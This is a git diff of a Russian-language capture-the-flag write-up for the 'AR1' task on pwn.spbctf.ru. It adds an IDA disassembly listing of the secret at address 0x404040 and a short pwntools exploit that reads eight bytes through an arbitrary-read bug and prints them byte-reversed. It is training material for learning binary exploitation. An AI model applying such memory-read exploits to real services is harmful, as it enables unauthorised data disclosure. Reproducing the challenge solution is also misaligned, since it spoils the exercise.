@@ -5,10 +5,30 @@
 **[ar1.elf](https://pwn.spbctf.ru/files/www/AR1/ar1.elf)**
 
 Флаг лежит по адресу 0x404040, также в солвере необходимо учесть, что байты в памяти лежат в обратном порядке.
-![{ECD70ADB-CD87-4CE5-B627-13DA44AF86DD}](../../../../z.%20Images/{ECD70ADB-CD87-4CE5-B627-13DA44AF86DD}.png)
+```
+.data:0000000000404040                         public secret
+.data:0000000000404040 secret                  db  11h
+.data:0000000000404041                         db  11h
+.data:0000000000404042                         db  11h
+.data:0000000000404043                         db  11h
+.data:0000000000404044                         db  11h
+.data:0000000000404045                         db  11h
+.data:0000000000404046                         db  11h
+.data:0000000000404047                         db  11h
+.data:0000000000404047 _data                   ends
+```
 
-Солвер:
-![{6BDA00DD-AAAC-450A-A64C-1A81A727F810}](../../../../z.%20Images/{6BDA00DD-AAAC-450A-A64C-1A81A727F810}.png)
+Эксплоит:
+``` python
+io = start()
+
+io.sendlineafter(b': ', b'404040')
+io.recvuntil(b': ')
+flag = io.recv(8)[::-1].hex()
+print(flag)
+
+io.interactive()
+```
 
 Запуск:
 ![Pasted image 20260408100141](../../../../z.%20Images/Pasted%20image%2020260408100141.png)
